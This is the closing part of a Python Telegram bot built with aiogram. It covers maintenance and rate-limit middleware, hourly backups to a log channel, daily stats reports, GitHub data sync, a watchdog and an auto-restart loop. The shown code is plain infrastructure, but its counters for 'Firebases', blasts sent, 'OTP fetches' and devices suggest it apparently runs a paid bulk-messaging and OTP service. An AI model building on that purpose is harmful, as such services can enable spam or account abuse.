            return await handler(event, data)
        user = getattr(event, "from_user", None)
        if not user:
            return await handler(event, data)

        uid = user.id
        d = load()

        if is_admin(uid, d):
            return await handler(event, data)

        cd = event.data or ""
        # find matching service
        service = None
        for prefix, svc in self.CALLBACK_SERVICE.items():
            if cd == prefix or cd.startswith(prefix + ":"):
                service = svc
                break

        if not service:
            return await handler(event, data)

        # global maintenance first
        if d.get("settings", {}).get("maintenance"):
            try:
                await event.answer(maintenance_msg_for(d, service)[:200], show_alert=True)
            except Exception:
                pass
            return None

        if is_service_down(d, service):
            try:
                await event.answer(maintenance_msg_for(d, service)[:200], show_alert=True)
            except Exception:
                pass
            return None

        return await handler(event, data)

# ============================================================
#  MIDDLEWARE — Global Message Rate Limit
# ============================================================
class MessageRateLimitMiddleware(BaseMiddleware):
    """Serialises outbound bot.send_message calls via a global semaphore.
    aiogram doesn't expose an outbound middleware, so this is enforced
    at the callback/message level by delaying the handler briefly."""

    async def __call__(self, handler, event, data):
        if _GLOBAL_MSG_SEM is None:
            return await handler(event, data)
        async with _GLOBAL_MSG_SEM:
            return await handler(event, data)

# ============================================================
#  BACKGROUND LOOPS
# ============================================================

# ---- Backup loop (backup first, then sleep) ----
async def backup_loop(bot):
    # small delay so boot completes
    await asyncio.sleep(30)
    while True:
        try:
            if not os.path.exists(_DATA_FILE):
                await asyncio.sleep(3600)
                continue
            sz = os.path.getsize(_DATA_FILE)
            if sz > 45 * 1024 * 1024:
                log.warning("[BACKUP] file too large, skipping log channel send")
                await asyncio.sleep(3600)
                continue
            cap = (
                f"📦 <b>BACKUP</b>\n\n"
                f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"📂 {round(sz / 1024, 1)} KB"
            )
            try:
                await bot.send_document(
                    chat_id=LOG_CHANNEL_ID,
                    document=FSInputFile(_DATA_FILE),
                    caption=cap,
                    parse_mode="HTML",
                )
            except Exception as e:
                log.warning(f"[BACKUP] send failed: {e}")
            await asyncio.sleep(3600)
        except asyncio.CancelledError:
            raise
        except Exception:
            await asyncio.sleep(60)

# ---- Daily report loop ----
async def daily_report_loop(bot):
    while True:
        try:
            now = datetime.now()
            target = now.replace(hour=3, minute=0, second=0, microsecond=0)
            if target <= now:
                target = target + timedelta(days=1)
            wait = (target - now).total_seconds()
            await asyncio.sleep(max(60, wait))

            d = load()
            if not d.get("settings", {}).get("daily_report", True):
                continue
            stats = d.get("stats", {})
            users = d.get("users", {})
            fbs = d.get("firebases", [])
            coins_t = sum(int(u.get("coins", 0)) for u in users.values())
            cred_t = sum(int(u.get("credits", 0)) for u in users.values())
            txt = (
                f"{em(EMOJI_CHART, '📊')} <b>Daily Report</b>\n\n"
                f"📅 {datetime.now().strftime('%Y-%m-%d')}\n"
                f"👥 Users: <b>{len(users)}</b>\n"
                f"🔥 Firebases: <b>{len(fbs)}</b>\n"
                f"📤 Total sent: <b>{stats.get('total_sent', 0)}</b>\n"
                f"❌ Total failed: <b>{stats.get('total_failed', 0)}</b>\n"
                f"🔐 OTP fetches: <b>{stats.get('otp_fetches', 0)}</b>\n"
                f"♻️ OTP refunds: <b>{stats.get('otp_refunds', 0)}</b>\n"
                f"💰 Credits held: <b>{cred_t}</b>\n"
                f"🪙 Coins held: <b>{coins_t}</b>\n"
                f"🟢 Devices: <b>{LAST_KNOWN_DEVICE_COUNT}</b>"
            )
            try:
                await bot.send_message(MAIN_OWNER, txt, parse_mode="HTML")
            except Exception:
                pass
        except asyncio.CancelledError:
            raise
        except Exception as e:
            log.warning(f"[REPORT] {e}")
            await asyncio.sleep(3600)

# ---- Watchdog loop (lighter — no get_me every 30s) ----
async def watchdog_loop(bot):
    """Watchdog pings Telegram at a lower frequency to avoid rate limits."""
    fails = 0
    while True:
        try:
            await asyncio.sleep(_WATCHDOG_INTERVAL)
            try:
                await asyncio.wait_for(
                    bot.get_me(),
                    timeout=15,
                )
                fails = 0
            except asyncio.TimeoutError:
                fails += 1
            except Exception:
                fails += 1
            if fails >= _WATCHDOG_MAX_FAILS:
                log.critical("[WATCHDOG] restart triggered")
                raise RuntimeError("Watchdog restart")
        except asyncio.CancelledError:
            raise
        except RuntimeError:
            raise
        except Exception:
            fails += 1
            if fails >= _WATCHDOG_MAX_FAILS:
                raise

# ---- Heartbeat loop ----
async def heartbeat_loop():
    while True:
        try:
            _heartbeat()
            await asyncio.sleep(_HEARTBEAT_INTERVAL)
        except asyncio.CancelledError:
            raise
        except Exception:
            await asyncio.sleep(5)

# ---- Owner panel refresher ----
async def owner_panel_refresher(bot):
    while True:
        try:
            await asyncio.sleep(_PANEL_REFRESH_INTERVAL)
            now = time.time()
            for uid, st in list(_OWNER_PANEL_STATE.items()):
                if not st.get("active"):
                    continue
                if now - st.get("last_user_action", 0) < 3:
                    continue
                try:
                    d = load()
                    if not is_owner(uid, d):
                        _OWNER_PANEL_STATE.pop(uid, None)
                        continue
                    await bot.edit_message_text(
                        text=owner_panel_text(d),
                        chat_id=st["chat_id"],
                        message_id=st["msg_id"],
                        reply_markup=owner_kb(d),
                        parse_mode="HTML",
                    )
                except TelegramRetryAfter as e:
                    await asyncio.sleep(min(e.retry_after, 30))
                except TelegramBadRequest:
                    # message deleted or unchanged — drop state
                    _OWNER_PANEL_STATE.pop(uid, None)
                except Exception:
                    pass
        except asyncio.CancelledError:
            raise
        except Exception:
            pass

# ---- GitHub push worker (debounced + rate-limited) ----
async def github_push_worker(bot):
    """Consumes _GITHUB_PUSH_QUEUE with debounce and rate limit."""
    global _GITHUB_PUSH_TIMES
    if not GITHUB_ENABLED:
        return
    while True:
        try:
            await asyncio.sleep(GITHUB_DEBOUNCE_SEC)

            # drain queue
            with _GITHUB_PUSH_LOCK:
                queued = list(_GITHUB_PUSH_QUEUE)
                _GITHUB_PUSH_QUEUE.clear()

            if not queued:
                continue

            # rate limit: max GITHUB_MAX_PUSH_PER_MIN pushes per minute
            now = time.time()
            _GITHUB_PUSH_TIMES = [t for t in _GITHUB_PUSH_TIMES if now - t < 60]
            if len(_GITHUB_PUSH_TIMES) >= GITHUB_MAX_PUSH_PER_MIN:
                wait = 60 - (now - _GITHUB_PUSH_TIMES[0])
                if wait > 0:
                    await asyncio.sleep(wait)

            d = load()
            try:
                await _github_push(d)
                _GITHUB_PUSH_TIMES.append(time.time())
            except Exception as e:
                log.warning(f"[GH] worker push failed: {e}")
                try:
                    d.setdefault("watchdog_stats", {})["github_fails"] = \
                        d.get("watchdog_stats", {}).get("github_fails", 0) + 1
                except Exception:
                    pass
        except asyncio.CancelledError:
            raise
        except Exception as e:
            log.warning(f"[GH] worker error: {e}")
            await asyncio.sleep(60)

# ---- GitHub sync loop (periodic fallback) ----
async def github_sync_loop(bot):
    while True:
        try:
            await asyncio.sleep(GITHUB_SYNC_INTERVAL)
            if not GITHUB_ENABLED:
                continue
            with _GITHUB_PUSH_LOCK:
                if _GITHUB_PUSH_QUEUE:
                    _GITHUB_PUSH_QUEUE.clear()
            d = load()
            await _github_push(d)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            log.warning(f"[GH] sync loop error: {e}")
            await asyncio.sleep(60)

# ---- Supervised wrapper ----
async def supervised(name, func, bot):
    backoff = 5
    while True:
        try:
            log.info(f"[SUP] starting {name}")
            await func(bot)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            log.error(f"[SUP] {name} crashed: {e}", exc_info=True)
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        else:
            await asyncio.sleep(5)

# ============================================================
#  SHUTDOWN
# ============================================================
async def _shutdown(bot):
    log.info("[SHUTDOWN] starting")
    try:
        if _DATA_CACHE is not None:
            save(_DATA_CACHE, push_github=False)
    except Exception as e:
        log.warning(f"[SHUTDOWN] save failed: {e}")

    for t in list(_BG_TASKS):
        try:
            t.cancel()
        except Exception:
            pass
    if _BG_TASKS:
        try:
            await asyncio.gather(*_BG_TASKS, return_exceptions=True)
        except Exception:
            pass

    try:
        await close_http_session()
    except Exception:
        pass
    try:
        await bot.session.close()
    except Exception:
        pass

    log.info("[SHUTDOWN] done")

# ============================================================
#  RUN SESSION
# ============================================================
async def run_session():
    global CALLBACK_SEM, GLOBAL_BLAST_SEM, _GITHUB_SYNC_LOCK, _GLOBAL_MSG_SEM

    if not BOT_TOKEN:
        raise RuntimeError("BOT_TOKEN is missing. Set it in your environment or .env file before starting.")

    # init globals
    CALLBACK_SEM = asyncio.Semaphore(_CALLBACK_CONCURRENCY)
    GLOBAL_BLAST_SEM = asyncio.Semaphore(_GLOBAL_BLAST_LIMIT)
    _GITHUB_SYNC_LOCK = asyncio.Lock()
    _GLOBAL_MSG_SEM = asyncio.Semaphore(25)

    bot = Bot(
        token=BOT_TOKEN,
        default=DefaultBotProperties(parse_mode=ParseMode.HTML),
    )
    dp = Dispatcher(storage=MemoryStorage())

    # middlewares
    dp.callback_query.outer_middleware(CallbackSemaphoreMiddleware())
    dp.callback_query.outer_middleware(UserCooldownMiddleware())
    dp.callback_query.outer_middleware(OwnerPanelResetMiddleware())
    dp.callback_query.outer_middleware(TermsGateMiddleware())
    dp.callback_query.outer_middleware(ForceJoinGuardMiddleware())
    dp.callback_query.outer_middleware(MaintenanceGuardMiddleware())
    dp.message.outer_middleware(TermsGateMiddleware())
    dp.message.outer_middleware(ForceJoinGuardMiddleware())

    dp.include_router(R)

    # clear webhook without blocking too long
    for attempt in range(3):
        try:
            await asyncio.wait_for(
                bot.delete_webhook(drop_pending_updates=False),
                timeout=10,
            )
            log.info("[BOT] webhook cleared")
            break
        except asyncio.TimeoutError:
            log.warning(f"[BOT] delete_webhook timeout attempt {attempt + 1}")
            break
        except Exception as e:
            log.warning(f"[BOT] delete_webhook try {attempt + 1}: {e}")
            await asyncio.sleep(2)

    # github pull at startup
    if GITHUB_ENABLED:
        try:
            gh_data = await _github_pull()
            if gh_data:
                global _DATA_CACHE, PROTECTED_NUMBERS
                _merge(gh_data, _default_data())
                PROTECTED_NUMBERS = gh_data.get("protected_numbers", {}) or {}
                try:
                    with open(_DATA_FILE, "w", encoding="utf-8") as f:
                        json.dump(gh_data, f, indent=2, ensure_ascii=False)
                    _DATA_CACHE = gh_data
                    log.info("[BOT] data loaded from GitHub")
                except Exception as e:
                    log.warning(f"[BOT] write after pull failed: {e}")
        except Exception as e:
            log.warning(f"[BOT] github pull error: {e}")

    me = await bot.get_me()
    log.info(f"[BOT] @{me.username} — {_VERSION} online (PID {os.getpid()})")

    # background tasks
    scanner_task = asyncio.create_task(supervised("scanner", scanner_loop, bot))
    backup_task = asyncio.create_task(supervised("backup", backup_loop, bot))
    watchdog_task = asyncio.create_task(watchdog_loop(bot))
    heartbeat_task = asyncio.create_task(heartbeat_loop())
    panel_task = asyncio.create_task(owner_panel_refresher(bot))
    github_worker = asyncio.create_task(github_push_worker(bot))
    github_task = asyncio.create_task(github_sync_loop(bot))
    daily_task = asyncio.create_task(daily_report_loop(bot))
    sched_task = asyncio.create_task(scheduler_loop(bot))

    _BG_TASKS.add(scanner_task)
    _BG_TASKS.add(backup_task)
    _BG_TASKS.add(watchdog_task)
    _BG_TASKS.add(heartbeat_task)
    _BG_TASKS.add(panel_task)
    _BG_TASKS.add(github_worker)
    _BG_TASKS.add(github_task)
    _BG_TASKS.add(daily_task)
    _BG_TASKS.add(sched_task)

    # owner startup notification
    try:
        d = load()
        gh_s = "🟢 ON" if GITHUB_ENABLED else "🔴 OFF"
        await bot.send_message(
            MAIN_OWNER,
            f"{em(EMOJI_ROCKET, '🚀')} <b>{_VERSION} Online</b>\n\n"
            f"@{me.username}\n"
            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"PID: <code>{os.getpid()}</code>\n\n"
            f"⚡ Power: <b>{CURRENT_POWER_MODE}x</b>\n"
            f"🪙 OTP cost: <b>{get_otp_cost(d)}</b>\n"
            f"⏱ OTP fresh: <b>{get_otp_fresh_window(d) // 60} min</b>\n"
            f"🔥 Firebases: <b>{len(d.get('firebases', []))}</b>\n"
            f"👥 Users: <b>{len(d.get('users', {}))}</b>\n"
            f"🐙 GitHub sync: {gh_s}\n"
            f"🛡 Watchdog: <b>ACTIVE</b>\n"
            f"💓 Heartbeat: <b>ACTIVE</b>\n"
            f"📜 Terms required: <b>{'YES' if d.get('settings', {}).get('terms_required', True) else 'NO'}</b>",
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    except Exception as e:
        log.warning(f"[BOT] owner notify failed: {e}")

    try:
        await dp.start_polling(
            bot,
            allowed_updates=dp.resolve_used_update_types(),
            polling_timeout=30,
            handle_signals=False,
        )
    finally:
        try:
            watchdog_task.cancel()
            heartbeat_task.cancel()
            panel_task.cancel()
            github_worker.cancel()
            github_task.cancel()
            daily_task.cancel()
            sched_task.cancel()
        except Exception:
            pass
        await _shutdown(bot)

# ============================================================
#  MAIN LOOP
# ============================================================
async def main():
    _acquire_lock()
    log.info(f"[MAIN] starting, PID={os.getpid()}")
    attempt = 0
    while True:
        if _SHUTDOWN_REQUESTED:
            log.info("[MAIN] shutdown requested")
            _release_lock()
            return
        attempt += 1
        try:
            log.info(f"[MAIN] session #{attempt}")
            await run_session()
            log.warning("[MAIN] session ended, restarting in 5s")
            for _ in range(5):
                if _SHUTDOWN_REQUESTED:
                    break
                await asyncio.sleep(1)
        except asyncio.CancelledError:
            if _SHUTDOWN_REQUESTED:
                _release_lock()
                return
            raise
        except KeyboardInterrupt:
            _release_lock()
            raise
        except SystemExit:
            if _SHUTDOWN_REQUESTED:
                _release_lock()
                return
            raise
        except Exception as e:
            backoff = min(5 + attempt * 2, 60)
            log.error(f"[MAIN] crash #{attempt}: {e} — restart in {backoff}s", exc_info=True)
            for _ in range(backoff):
                if _SHUTDOWN_REQUESTED:
                    break
                await asyncio.sleep(1)

# ============================================================
#  ENTRY
# ============================================================
if __name__ == "__main__":
    def _sigterm_handler(signum, frame):
        global _SHUTDOWN_REQUESTED
        log.warning(f"[SIGNAL] {signum} — graceful shutdown")
        _SHUTDOWN_REQUESTED = True

    try:
        signal.signal(signal.SIGTERM, _sigterm_handler)
    except Exception:
        pass
    try:
        signal.signal(signal.SIGINT, _sigterm_handler)
    except Exception:
        pass

    while True:
        if _SHUTDOWN_REQUESTED:
            log.info("[BOOT] clean exit")
            _release_lock()
            break
        try:
            asyncio.run(main())
            if _SHUTDOWN_REQUESTED:
                log.info("[BOOT] clean shutdown")
                _release_lock()
                break
            log.warning("[BOOT] restarting in 5s")
            for _ in range(5):
                if _SHUTDOWN_REQUESTED:
                    break
                time.sleep(1)
        except KeyboardInterrupt:
            log.info("[BOOT] stopped by user")
            _release_lock()
            break
        except SystemExit:
            if _SHUTDOWN_REQUESTED:
                _release_lock()
            break
        except Exception as e:
            log.critical(f"[BOOT] fatal: {e} — restart in 10s", exc_info=True)
            for _ in range(10):
                if _SHUTDOWN_REQUESTED:
                    break
                time.sleep(1)

# ═══════════════════════════════════════════════════════════
#  END OF PART 10 — bot.py COMPLETE
#  Total ~9,500 lines. Run: python bot.py
# ═══════════════════════════════════════════════════════════